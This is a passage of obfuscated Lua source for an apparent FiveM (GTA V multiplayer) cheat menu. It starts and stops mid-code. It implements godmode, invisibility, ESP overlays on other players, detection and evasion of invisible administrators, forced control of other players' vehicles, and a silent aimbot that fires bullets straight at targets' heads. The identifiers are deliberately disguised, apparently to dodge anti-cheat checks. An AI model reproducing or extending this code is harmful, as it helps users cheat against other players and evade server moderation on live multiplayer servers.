        if IsDisabledControlJustPressed(0, 15) and y < (0.3) and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["vehicleList"].static = scrolls["vehicleList"].static + add
        end


        for i = 1, #vehlist do
            if i > 0 then
                local selected = false

                local clickYPos = ((0.05 * 1.0) + (i - 1) * 0.024) + y + Drag.LoaderY

                local currentVehicle = vehlist[i].vehicle

                local vehicleName = GetDisplayNameFromVehicleModel(GetEntityModel(currentVehicle))

                local selfCoords = GetEntityCoords(PlayerPedId())

                local vehCoords = GetEntityCoords(currentVehicle)

                local distance = GetDistanceBetweenCoords(selfCoords, vehCoords, false)



                if distance < listVariables.distanceLimit then
                    local r, g, b = 255, 255, 255

                    local vehStateText = "D"

                    if GetPedInVehicleSeat(currentVehicle, -1) ~= 0 then
                        vehStateText = "I"
                    end



                    -- Verifica se o veículo corresponde à pesquisa

                    if not interact.textBoxes["searchVehs"].text or interact.textBoxes["searchVehs"].text == "" or string.match(vehicleName:lower(), interact.textBoxes["searchVehs"].text:lower()) then
                        if clickYPos >= 0.34 + Loader_Y and clickYPos <= 0.5300 + Loader_Y then
                            local vehInformation = ' ' ..
                                vehicleName .. ' ' .. vehStateText .. ' - ' .. math.ceil(vehlist[i].distance)



                            for k, vehicle in pairs(vehiclesSelected) do
                                if vehicle == currentVehicle then
                                    r, g, b = overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b

                                    if vehicle == SelectedVeh then
                                        vehInformation = '• ' ..
                                            vehicleName .. ' ' .. vehStateText .. ' - ' .. math.ceil(vehlist[i].distance)
                                    end



                                    selected = true
                                end
                            end



                            -- Desenha o botão do veículo

                            if interact.PlayerButton(vehInformation, 0.45 + Drag.LoaderX, clickYPos + 0.025, false, r, g, b) then
                                if selected then
                                    for k, vehicle in pairs(vehiclesSelected) do
                                        if vehicle == currentVehicle then
                                            table.remove(vehiclesSelected, k)

                                            SelectedVeh = getlastitem(vehiclesSelected)

                                            break
                                        end
                                    end
                                else
                                    table.insert(vehiclesSelected, currentVehicle)

                                    SelectedVeh = currentVehicle
                                end
                            end
                        end
                    end
                end
            end
        end
    end,









    ifs = function()
        if SelectedVeh then
            if not IsPedInVehicle(PlayerPedId(), SelectedVeh) then
                local modelType = 0

                local addy = 4

                if GetVehicleClass(SelectedVeh) == 16 then
                    modelType = 7

                    addy = 3
                elseif GetVehicleClass(SelectedVeh) == 15 then
                    modelType = 34

                    addy = 4
                elseif GetVehicleClass(SelectedVeh) == 8 then
                    modelType = 37

                    addy = 3
                elseif GetVehicleClass(SelectedVeh) == 21 or GetVehicleClass(SelectedVeh) == 20 then
                    modelType = 39

                    addy = 3
                elseif GetVehicleClass(SelectedVeh) == 14 then
                    modelType = 35

                    addy = 3
                elseif GetVehicleClass(SelectedVeh) == 13 then
                    modelType = 38

                    addy = 3
                elseif GetDisplayNameFromVehicleModel(GetEntityModel(SelectedVeh)) == "THRUSTER" then
                    modelType = 41

                    addy = 3
                end

                modelCoords = GetEntityCoords(SelectedVeh)

                DrawMarker(modelType, modelCoords.x, modelCoords.y, modelCoords.z + addy, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
                    2.0, 2.0, 2.0, overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b, 255, true, true,
                    2, nil, nil, false)
            end
        end




        if healthmodule.godmode then
            LocalPlayer.state.ban2 = false
            SetEntityOnlyDamagedByRelationshipGroup(PlayerPedId(), true, tostring(math.random(1000000, 9999999)))
        else
            SetEntityOnlyDamagedByRelationshipGroup(PlayerPedId(), false)
        end








        if healthmodule.inv1s1bl3 then
            SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), false, false)

            SetEntityVisible(PlayerPedId(), false)
        end



        if healthmodule.antadm then
            for an in EnumeratePeds() do
                local adm = IsEntityVisible(an)

                if not adm or administrador then
                    local cC = GetEntityCoords(an)

                    local me = an ~= PlayerPedId()

                    local mr = IsPedAPlayer(an)

                    local cD = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), cC.x, cC.y, cC.z, true) *
                        (1.6 - 0.05) -- Tamanho

                    local c00rds = GetEntityCoords(PlayerPedId())

                    local dismax = Sliders['n0st4ff'].value

                    if cD < dismax then
                        local coordx = c00rds.x

                        local coordy = c00rds.y + 500



                        if me and GetEntityHealth(an) > 101 then
                            for Zpos = 10, -200, -5 do
                                SetEntityCoordsNoOffset(PlayerPedId(), coordx, coordy, Zpos + 0.0, true, true, true,
                                    false)

                                local zPos = GetGroundZFor_3dCoord(coordx, coordy, Zpos + 0.0)

                                Wait(0)
                            end

                            ClearDrawOrigin()
                        end
                    end
                end
            end
        end



        if healthmodule.s4po then
            SetPedCanRagdoll(PlayerPedId(), false)

            if IsDisabledControlJustPressed(0, 22) then
                ApplyForceToEntity(PlayerPedId(), 3, 0.0, 0.0, Sliders['s4populo'].value, 0.0, 0.0, 0.0, 0, 0, 0, 1, 1, 1)
            end
        end



        if healthmodule.r0d44rm4s then
            Citizen.InvokeNative(0x9DFE13ECDC1EC196, PlayerPedId(), true)
            LocalPlayer.state.pvp = true
            for i = 0, 354 do
                EnableControlAction(0, i, true)
            end
        else
            LocalPlayer.state.pvp = false
        end





        if healthmodule.afog4do then
            SetPedMaxTimeUnderwater(PlayerPedId(), 50)
        end



        if healthmodule.f4strun then
            local sp3edrun = 10

            sp3edrun = Sliders['fastrun'].value

            SetPedCanRagdoll(PlayerPedId(), false)

            SetEntityVelocity(PlayerPedId(),
                GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, sp3edrun, GetEntityVelocity(PlayerPedId())[3]) -
                GetEntityCoords(PlayerPedId()))
        end





        if healthmodule.s0c4o then
            SetWeaponDamageModifierThisFrame(GetHashKey('WEAPON_UNARMED'), 10000.0)
        end



        if H07nB00st33r and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            if IsControlPressed(1, 38) then
                SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 80 + 0.0)
            end
        end



        if handling2 then
            Invoken(0x93A3996368C94158, GetVehiclePedIsIn(Invoken(0x43A66C31C68491C0, -1), false),
                Sliders["speedboost"].value + 0.0 * 20.0)
        else
            Invoken(0x93A3996368C94158, GetVehiclePedIsIn(Invoken(0x43A66C31C68491C0, -1), false), 20.0)
        end



        if vehrgb and IsPedInAnyVehicle(PlayerPedId()) then
            ra = RGBcarrito(1.3)

            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)

            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
        end



        if vehfly and IsPedInAnyVehicle(PlayerPedId(), false) then
            --DisableControlAction(0, 76, true)

            DisableControlAction(0, 63, true)

            DisableControlAction(0, 64, true)

            --DisableControlAction(0, 21, true)

            local veh = GetVehiclePedIsIn(PlayerPedId(), false)

            local vel = GetEntityVelocity(veh)

            local color = { r = 128, g = 0, b = 128, a = 255 }

            local vehrot = GetEntityRotation(veh, 2)

            local pitch = vehrot.x

            local roll = 0

            local yaw = vehrot.z

            --SetEntityHeading(veh, GetEntityHeading(veh)) this can be used for noclip



            if IsDisabledControlPressed(0, 63) then -- A
                yaw = yaw + 1.0

                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end

            if IsDisabledControlPressed(0, 64) then -- D
                yaw = yaw - 1.0

                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end

            local vehpos = GetEntityCoords(GetVehiclePedIsIn(PlayerPedId(), false))

            --if IsDisabledControlPressed(0, 76) then -- space

            --  SetEntityVelocity(veh, vel.x, vel.y, vel.z + 1.0)

            --end

            if IsDisabledControlPressed(0, 21) then -- shift
                pitch = pitch - 1.0

                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end

            if IsDisabledControlPressed(0, 62) then -- ctrl
                pitch = pitch + 1.0

                SetEntityRotation(veh, pitch, roll, yaw, 2, true)
            end

            if IsControlPressed(0, 71) then                                        -- Coords
                SetVehicleForwardSpeed(GetVehiclePedIsIn(PlayerPedId(), false),
                    GetEntitySpeed(GetVehiclePedIsIn(PlayerPedId(), false)) + 0.3) -- 0.3 default
            end

            if IsDisabledControlPressed(0, 72) then -- s
                SetVehicleForwardSpeed(GetVehiclePedIsIn(PlayerPedId(), false),
                    GetEntitySpeed(GetVehiclePedIsIn(PlayerPedId(), false)) - 1.0)
            end

            SetEntityRotation(veh, pitch, roll, yaw, 2, true)



            local mph = GetEntitySpeed(GetVehiclePedIsIn(PlayerPedId(), false)) * 2.236936

            if mph > 335 and mph < 337 then
                local color = { r = 128, g = 0, b = 128, a = 255 }

                --drawText('Max Speed, Derestric Max Speed to go faster', notifX - 0.17 / 2 + 0.01, notifY + 0.07, 4, color, 0.4, false, true, false)
            end
        else
            --DisableControlAction(0, 76, false)

            DisableControlAction(0, 63, false)

            DisableControlAction(0, 64, false)

            --DisableControlAction(0, 21, false)
        end



        if esp_nome then
            local myPos = GetEntityCoords(PlayerPedId(), true)



            for k, v in pairs(GetActivePlayers()) do
                if GetPlayerPed(v) ~= GetPlayerPed(-1) then
                    local targetPed = GetPlayerPed(v)

                    local targetPos = GetEntityCoords(targetPed, true)

                    local distance = #(vector3(myPos.x, myPos.y, myPos.z) - vector3(targetPos.x, targetPos.y, targetPos.z))



                    if distance < 350 then
                        local isInFOV = IsEntityOnScreen(targetPed)

                        local isInvisible = not IsEntityVisibleToScript(targetPed)



                        if isInFOV then
                            local distanceText = math.floor(distance) .. "m"

                            local offset = vector3(0, 0, -1)



                            if NetworkIsPlayerTalking(v) then
                                DrawText3DD(targetPos.x, targetPos.y, targetPos.z + offset.z,
                                    "" .. GetPlayerName(v) .. '\n[FALANDO] - ' .. distanceText, 255, 255, 255, 255, 2.0)
                            else
                                local textToShow = isInvisible and "[STAFF]" or ""

                                local r, g, b = isInvisible and RGBRainbow(2.0).r or 255,
                                    isInvisible and RGBRainbow(2.0).g or 255, isInvisible and RGBRainbow(2.0).b or 255

                                DrawText3DD(targetPos.x, targetPos.y, targetPos.z + offset.z,
                                    GetPlayerName(v) .. ' ' .. textToShow .. '\n' .. distanceText, r, g, b, 255, 2.0)
                            end
                        end
                    end
                end
            end
        end



        if espadm2 then
            local maxDistance = 500

            local myPlayerId = PlayerId()

            local myPos = GetEntityCoords(PlayerPedId())



            for _, player in ipairs(GetActivePlayers()) do
                if player ~= myPlayerId then
                    local myped = GetPlayerPed(player)

                    if myped ~= -1 and myped ~= nil then
                        local playerPos = GetEntityCoords(myped)

                        local distance = #(myPos - playerPos)



                        if IsEntityVisibleToScript(myped) == false and distance <= maxDistance then
                            if distance < maxDistance then
                                if true and not IsEntityDead(myped) then
                                    if HasEntityClearLosToEntity(PlayerPedId(), myped, 19) and IsEntityOnScreen(myped) then
                                        local ra = RGBRainbow(2.0)





                                        DrawLine(GetPedBoneCoords(myped, 31086), GetPedBoneCoords(myped, 0x9995), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9995), GetEntityCoords(myped), ra.r, ra.g,
                                            ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x5C57), GetEntityCoords(myped), ra.r, ra.g,
                                            ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x192A), GetEntityCoords(myped), ra.r, ra.g,
                                            ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x3FCF), GetPedBoneCoords(myped, 0x192A), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xCC4D), GetPedBoneCoords(myped, 0x3FCF), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xB3FE), GetPedBoneCoords(myped, 0x5C57), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xB3FE), GetPedBoneCoords(myped, 0x3779), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9995), GetPedBoneCoords(myped, 0xB1C5), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xB1C5), GetPedBoneCoords(myped, 0xEEEB), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0xEEEB), GetPedBoneCoords(myped, 0x49D9), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9995), GetPedBoneCoords(myped, 0x9D4D), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x9D4D), GetPedBoneCoords(myped, 0x6E5C), ra.r,
                                            ra.g, ra.b, 255)

                                        DrawLine(GetPedBoneCoords(myped, 0x6E5C), GetPedBoneCoords(myped, 0xDEAD), ra.r,
                                            ra.g, ra.b, 255)



                                        local myPos = GetPedBoneCoords(myped, 31086)

                                        DrawMarker(28, myPos.x, myPos.y, myPos.z + 0.06, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0,
                                            0.1, 0.1, 0.1, ra.r, ra.g, ra.b, 255, false, Stan_true, 2, kakamenuv3ss,
                                            kakamenuv3ss, false)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end



        if espadm then
            local maxDistance = 500

            local myPos = GetEntityCoords(PlayerPedId())



            for _, player in ipairs(GetActivePlayers()) do
                local myped = GetPlayerPed(player)

                if myped ~= -1 and myped ~= nil then
                    local playerPos = GetEntityCoords(myped)

                    local distance = #(myPos - playerPos)



                    if IsEntityVisibleToScript(myped) == false and distance <= maxDistance then
                        if distance < maxDistance then
                            if true and not IsEntityDead(myped) then
                                if HasEntityClearLosToEntity(PlayerPedId(), myped, 19) and IsEntityOnScreen(myped) then
                                    local ra = RGBRainbow(2.0)

                                    DrawLine(myPos.x, myPos.y, myPos.z, playerPos.x, playerPos.y, playerPos.z, ra.r, ra
                                        .g, ra.b, 255)
                                end
                            end
                        end
                    end
                end
            end
        end



        if espaurora1 then
            local maxDistance = 500

            local myPos = GetEntityCoords(PlayerPedId())



            for _, player in ipairs(GetActivePlayers()) do
                local myped = GetPlayerPed(player)

                if myped ~= -1 and myped ~= nil then
                    local playerPos = GetEntityCoords(myped)

                    local distance = #(myPos - playerPos)



                    if distance <= maxDistance and not IsEntityDead(myped) then
                        local playerName = GetPlayerName(player)

                        if playerName and playerName == "Ryomen" then
                            DrawLine(myPos.x, myPos.y, myPos.z, playerPos.x, playerPos.y, playerPos.z, 255, 0, 0, 255)
                        end
                    end
                end
            end
        end



        if espaurora2 then
            local maxDistance = 500

            local myPos = GetEntityCoords(PlayerPedId())



            for _, player in ipairs(GetActivePlayers()) do
                local myped = GetPlayerPed(player)

                if myped ~= -1 and myped ~= nil then
                    local playerPos = GetEntityCoords(myped)

                    local distance = #(myPos - playerPos)



                    if distance <= maxDistance and not IsEntityDead(myped) then
                        local playerName = GetPlayerName(player)

                        if playerName and playerName == "Aurorinha" then
                            DrawLine(myPos.x, myPos.y, myPos.z, playerPos.x, playerPos.y, playerPos.z, 255, 0, 0, 255)
                        end
                    end
                end
            end
        end



        if vidabarra then
            local localPlayer = PlayerId()

            local localPed = PlayerPedId()



            for _, player in ipairs(GetActivePlayers()) do
                if player ~= localPlayer then
                    local targetPed = GetPlayerPed(player)



                    if DoesEntityExist(targetPed) and IsEntityOnScreen(targetPed) then
                        local includeself = false

                        local er = includeself and nil or localPed



                        local distance = GetDistanceBetweenCoords(GetEntityCoords(er), GetEntityCoords(targetPed), true)



                        if distance < 500.0 then
                            local dist = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(), GetEntityCoords(targetPed),
                                true)

                            SetDrawOrigin(GetEntityCoords(targetPed))



                            DrawRect(-0.2745 / dist - (dist / 500) / dist, 0, 0.0020, 2.0 / dist, 0, 0, 0, 255)

                            DrawRect(-0.2745 / dist - (dist / 500) / dist,
                                2.05 / dist - GetEntityHealth(targetPed) / 195 / dist, 0.001,
                                GetEntityHealth(targetPed) / 200 / dist, 30, 255, 30, 255)



                            ClearDrawOrigin()
                        end
                    end
                end
            end
        end



        if alertaadm then
            for an in EnumeratePeds() do
                local adm = IsEntityVisible(an)

                if not adm or administrador then
                    local cC = GetEntityCoords(an)

                    local me = an ~= PlayerPedId()

                    local mr = IsPedAPlayer(an)

                    local cD = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), cC.x, cC.y, cC.z, true) *
                        (1.6 - 0.05) -- Tamanho

                    local c00rds = GetEntityCoords(PlayerPedId())

                    local dismax = 20



                    if me and cD < dismax then
                        --print('Staff Observando')

                        interact.listBox(admobs, "Staff Observando", 0.2, 0.6, "StaffObservando")

                        --notifyrgbadm('Staff Observando')
                    end
                end
            end
        end



        function removeFromList(playerId)
            for i = #admlistpedID, 1, -1 do
                if admlistpedID[i] == playerId then
                    table.remove(admlistpedID, i)

                    table.remove(admlist, i) -- Remover o nome correspondente também

                    return
                end
            end
        end

        if listaadm then
            interact.listBox(admlist, "Administradores", 0.2, 0.3, "AdmList")

            local maxDistance = 500
            local myPos = GetEntityCoords(PlayerPedId())

            for _, player in ipairs(GetActivePlayers()) do
                local playerName = GetPlayerName(player)
                local myped = GetPlayerPed(player)

                if myped ~= -1 and myped ~= nil then
                    local playerPos = GetEntityCoords(myped)
                    local distance = #(myPos - playerPos)

                    if IsEntityVisibleToScript(myped) == false and distance <= maxDistance then
                        if not IsEntityDead(myped) then
                            if HasEntityClearLosToEntity(PlayerPedId(), myped, 19) and IsEntityOnScreen(myped) then
                                local isPlayerInList = false

                                for _, v in ipairs(admlistpedID) do
                                    if v == player then
                                        isPlayerInList = true
                                        break
                                    end
                                end

                                if not isPlayerInList and IsEntityVisible(myped) == false then
                                    table.insert(admlistpedID, player)
                                    table.insert(admlist, playerName)
                                end
                            end
                        end
                    end
                end
            end

            for i = #admlistpedID, 1, -1 do
                local playerId = admlistpedID[i]
                local playerPed = GetPlayerPed(playerId)

                if playerPed ~= nil then
                    local playerPos = GetEntityCoords(playerPed)
                    local distance = #(myPos - playerPos)

                    if distance > maxDistance then
                        removeFromList(playerId)
                    end
                end
            end
        end





        if espbox then
            local playerPed = PlayerPedId()



            for _, targetPlayer in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(targetPlayer)



                if targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)



                    local width = 0.3

                    local height = 1.7



                    local offsetX = 0.0

                    local offsetY = 0.0

                    local offsetZ = -1.0



                    local leftTopFront = GetOffsetFromEntityInWorldCoords(targetPed, -width + offsetX, width + offsetY,
                        offsetZ)

                    local rightTopFront = GetOffsetFromEntityInWorldCoords(targetPed, width + offsetX, width + offsetY,
                        offsetZ)

                    local leftBottomFront = GetOffsetFromEntityInWorldCoords(targetPed, -width + offsetX,
                        -width + offsetY, offsetZ)

                    local rightBottomFront = GetOffsetFromEntityInWorldCoords(targetPed, width + offsetX,
                        -width + offsetY, offsetZ)



                    local leftTopBack = GetOffsetFromEntityInWorldCoords(targetPed, -width + offsetX, width + offsetY,
                        height + offsetZ)

                    local rightTopBack = GetOffsetFromEntityInWorldCoords(targetPed, width + offsetX, width + offsetY,
                        height + offsetZ)

                    local leftBottomBack = GetOffsetFromEntityInWorldCoords(targetPed, -width + offsetX, -width + offsetY,
                        height + offsetZ)

                    local rightBottomBack = GetOffsetFromEntityInWorldCoords(targetPed, width + offsetX, -width + offsetY,
                        height + offsetZ)





                    local color = { 28, 92, 255, 255 }



                    local playerInvisible = not IsEntityVisibleToScript(targetPed)



                    if playerInvisible then
                        local rainbowColor = RGBRainbow(2.0)

                        color = { rainbowColor.r, rainbowColor.g, rainbowColor.b, 255 }
                    end



                    DrawLine(leftTopBack.x, leftTopBack.y, leftTopBack.z, rightTopBack.x, rightTopBack.y, rightTopBack.z,
                        color[1], color[2], color[3], color[4])



                    DrawLine(leftTopFront.x, leftTopFront.y, leftTopFront.z, rightTopFront.x, rightTopFront.y,
                        rightTopFront.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightTopFront.x, rightTopFront.y, rightTopFront.z, rightTopBack.x, rightTopBack.y,
                        rightTopBack.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightTopBack.x, rightTopBack.y, rightTopBack.z, leftTopBack.x, leftTopBack.y, leftTopBack.z,
                        color[1], color[2], color[3], color[4])

                    DrawLine(leftTopBack.x, leftTopBack.y, leftTopBack.z, leftTopFront.x, leftTopFront.y, leftTopFront.z,
                        color[1], color[2], color[3], color[4])



                    DrawLine(leftBottomBack.x, leftBottomBack.y, leftBottomBack.z, rightBottomBack.x, rightBottomBack.y,
                        rightBottomBack.z, color[1], color[2], color[3], color[4] - 0.05) -- Ajuste na posição vertical



                    DrawLine(leftBottomFront.x, leftBottomFront.y, leftBottomFront.z, rightBottomFront.x,
                        rightBottomFront.y, rightBottomFront.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightBottomFront.x, rightBottomFront.y, rightBottomFront.z, rightBottomBack.x,
                        rightBottomBack.y, rightBottomBack.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightBottomBack.x, rightBottomBack.y, rightBottomBack.z, leftBottomBack.x, leftBottomBack.y,
                        leftBottomBack.z, color[1], color[2], color[3], color[4])

                    DrawLine(leftBottomBack.x, leftBottomBack.y, leftBottomBack.z, leftBottomFront.x, leftBottomFront.y,
                        leftBottomFront.z, color[1], color[2], color[3], color[4])



                    DrawLine(leftTopFront.x, leftTopFront.y, leftTopFront.z, leftBottomFront.x, leftBottomFront.y,
                        leftBottomFront.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightTopFront.x, rightTopFront.y, rightTopFront.z, rightBottomFront.x, rightBottomFront.y,
                        rightBottomFront.z, color[1], color[2], color[3], color[4])

                    DrawLine(leftTopBack.x, leftTopBack.y, leftTopBack.z, leftBottomBack.x, leftBottomBack.y,
                        leftBottomBack.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightTopBack.x, rightTopBack.y, rightTopBack.z, rightBottomBack.x, rightBottomBack.y,
                        rightBottomBack.z, color[1], color[2], color[3], color[4])



                    DrawLine(leftTopBack.x, leftTopBack.y, leftTopBack.z, leftTopFront.x, leftTopFront.y, leftTopFront.z,
                        color[1], color[2], color[3], color[4])

                    DrawLine(rightTopBack.x, rightTopBack.y, rightTopBack.z, rightTopFront.x, rightTopFront.y,
                        rightTopFront.z, color[1], color[2], color[3], color[4])

                    DrawLine(rightBottomBack.x, rightBottomBack.y, rightBottomBack.z, rightBottomFront.x,
                        rightBottomFront.y, rightBottomFront.z, color[1], color[2], color[3], color[4])

                    DrawLine(leftBottomBack.x, leftBottomBack.y, leftBottomBack.z, leftBottomFront.x, leftBottomFront.y,
                        leftBottomFront.z, color[1], color[2], color[3], color[4])
                end
            end
        end



        if esp_vehs then
            for vehicle in EnumerateVehicles() do
                local x, y, z = table.unpack(GetEntityCoords(vehicle))

                local _, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)

                local x1, y1, z1 = table.unpack(GetEntityCoords(PlayerPedId()))

                local dist = tonumber(string.format('%.1f', GetDistanceBetweenCoords(x1, y1, z1, x, y, z, true)))

                local string = '~r~' ..
                    GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)) .. ' ~w~[ ~s~' .. dist .. ' ~s~M ~w~]'

                if dist < 300 then --Sll1d3rs['par3d3_d1st'].valu333 then
                    local ra = RaaGddBee22(3.7)

                    SetTextColour(28, 92, 255, 255)

                    DrawTextOutline(string, _x, _y, 0.25, 10, true, true, 28, 92, 255)
                end
            end
        end



        if puxmirado and IsControlJustPressed(0, 38) then
            local playerID = PlayerId()

            local _, entity = GetEntityPlayerIsFreeAimingAt(playerID)

            if entity and IsEntityAVehicle(entity) and IsVehicleSeatFree(entity, -1) then
                local playerPed = PlayerPedId()

                local playerCoords = GetEntityCoords(playerPed)

                NetworkRequestControlOfEntity(entity)

                local startTime = GetGameTimer()

                while not NetworkHasControlOfEntity(entity) do
                    local elapsedTime = GetGameTimer() - startTime

                    if elapsedTime > 5000 then
                        break
                    end

                    NetworkRequestControlOfEntity(entity)

                    Wait(10)
                end

                SetEntityCoordsNoOffset(entity, playerCoords)
            end
        end





        if controlveh then
            local r1_141 = SelectedVeh

            --print('SelectedVeh: ' ..SelectedVeh)

            if DoesEntityExist(r1_141) and not NetworkHasControlOfEntity(r1_141) then
                --print('aaa')

                local r2_141 = GetEntityCoords(PlayerPedId())

                if r11_0.city.group == "FLUXO" then
                    SetEntityCoordsNoOffset(PlayerPedId(), GetEntityCoords(r1_141))

                    Wait(1000)
                end

                NetworkRequestControlOfEntity(SelectedVeh)

                SetPedIntoVehicle(PlayerPedId(), r1_141, -1)

                Wait(300)

                SetEntityCoordsNoOffset(PlayerPedId(), r2_141)
            end
        end



        -- AIMBOT



        --[[         if A1mf00v3 then

            local F0v11 = (Sliders["circulo"].value / 200)

            DrawSprite('fov2', 'fov2', 0.5,0.5, F0v11, F0v11 * 1.8 ,0.0,255,255,255,255)

        end ]]







        if S1l3ntA1m then
            local F0v11 = (Sliders["circulo"].value / 200)

            local p333dd, a, b, c, d = getbixopuxePed()

            if b11xo00pux33P3ds then
                aped = p333dd
            else
                aped = IsPedAPlayer(p333dd)
            end

            if bixopuxeDeads then
                deads = p333dd
            else
                deads = not IsEntityDead(p333dd)
            end

            if A11mf03v_at74par3d3 then
                vis = logged2
            else
                vis = HasEntityClearLosToEntity(PlayerPedId(), p333dd, 17)
            end

            local hit = math.random(0, 100)

            local x, y, z = table.unpack(GetPedBoneCoords(p333dd, 31086))

            local _, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)

            local c = GetPedBoneCoords(p333dd, 31086)

            local x1, y1, z1 = table.unpack(c)

            local selfpos, rot = GetFinalRenderedCamCoord(), GetEntityRotation(PlayerPedId(), 2)

            local angleX, angleY, angleZ = (c - selfpos).x, (c - selfpos).y, (c - selfpos).z

            local am1g02 = false

            local roll, pitch, yaw = -math.deg(math.atan2(angleX, angleY)) - rot.z,
                math.deg(math.atan2(angleZ, #vector3(angleX, angleY, 0.0))), 1.0

            local d1stanc3 = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), x1, y1, z1, true)

            roll = 0.0 + (roll - 0.0)



            if p333dd ~= PlayerPedId() and IsEntityOnScreen(p333dd) then
                if (_x > 0.5 - ((F0v11 / 2) / 0.5) and _x < 0.5 + ((F0v11 / 2) / 0.5) and _y > 0.5 - ((F0v11 / 2) / 0.5) and _y < 0.5 + ((F0v11 / 2) / 0.5)) then
                    local unarmedhash = GetHashKey("weapon_unarmed")

                    local w3ap0n = GetSelectedPedWeapon(PlayerPedId())

                    if w3ap0n ~= unarmedhash then
                        if not IsEntityVisible(p333dd) then

                        else
                            if IsDisabledControlPressed(1, 25) then
                                if m0st7aralv0 and p333dd and d1stanc3 < 500 and d1stanc3 > 2 and GetEntityHealth(p333dd) > 101 and HasEntityClearLosToEntity(PlayerPedId(), p333dd, 19) then
                                    D7aw3dT3xt(x1, y1, z1 + 0.45, 3, "•", 200, 0, 0)

                                    DrawLine(GetEntityCoords(PlayerPedId()), x1, y1, z1, 255, 0, 0, 255)
                                end

                                if IsControlJustPressed(1, 24) then
                                    if d1stanc3 < 400 and d1stanc3 > 3 then
                                        if GetEntityHealth(p333dd) > 101 then
                                            Citizen.CreateThread(function()
                                                local pl2y3rP3d = PlayerPedId()

                                                local pl3ay3rC00rds = GetEntityCoords(pl2y3rP3d)

                                                local ta7g3tp3d = p333dd

                                                if not DoesEntityExist(ta7g3tp3d) then
                                                    return
                                                end

                                                local targ3tC00ds = GetEntityCoords(ta7g3tp3d)

                                                local headme = GetPedBoneCoords(pl2y3rP3d, 31086)

                                                local c = GetPedBoneCoords(p333dd, 31086)

                                                local bulletSpeed = 100

                                                local x1, y1, z1 = table.unpack(c)

                                                local x2, y2, z2 = table.unpack(headme)



                                                SetPedShootsAtCoord(pl2y3rP3d, x1, y1, z1, true)



                                                local ta7g3tH3adC000rdsd = GetPedBoneCoords(ta7g3tp3d, ta7g3tH3adB00n33)



                                                ShootSingleBulletBetweenCoords(x2, y2, z2, x1, y1, z1, bulletSpeed, true,
                                                    w3ap0n, pl2y3rP3d, true, false, -1.0, true)
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end



        if A11ml00ck3 then
            local F0v11 = (Sliders["circulo"].value / 200)

            local p333dd, a, b, c, d = getbixopuxePed()

            local v1da = GetEntityHealth(p333dd)

            if b11xo00pux33P3ds then
                aped = p333dd
            else
                aped = IsPedAPlayer(p333dd)
            end

            if bixopuxeDeads then
                deads = p333dd
            else
                deads = not IsEntityDead(p333dd)
            end

            if deads then
                if A11mf03v_at74par3d3 then
                    vis = logged2
                else
                    vis = HasEntityClearLosToEntity(PlayerPedId(), p333dd, 17)
                end

                local hit = math.random(0, 100)

                local x, y, z = table.unpack(GetPedBoneCoords(p333dd, 31086))

                local _, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)

                local c = GetPedBoneCoords(p333dd, 31086)

                local x1, y1, z1 = table.unpack(c)

                local selfpos, rot = GetFinalRenderedCamCoord(), GetEntityRotation(PlayerPedId(), 2)

                local angleX, angleY, angleZ = (c - selfpos).x, (c - selfpos).y, (c - selfpos).z

                local am1g02 = false

                local roll, pitch, yaw = -math.deg(math.atan2(angleX, angleY)) - rot.z,
                    math.deg(math.atan2(angleZ, #vector3(angleX, angleY, 0.0))), 1.0

                roll = 0.0 + (roll - 0.0)



                if v1da > 101 then
                    if aped and deads and hit <= Sliders['Sm00th1ng'].value * 10 and p333dd ~= PlayerPedId() and IsEntityOnScreen(p333dd) then
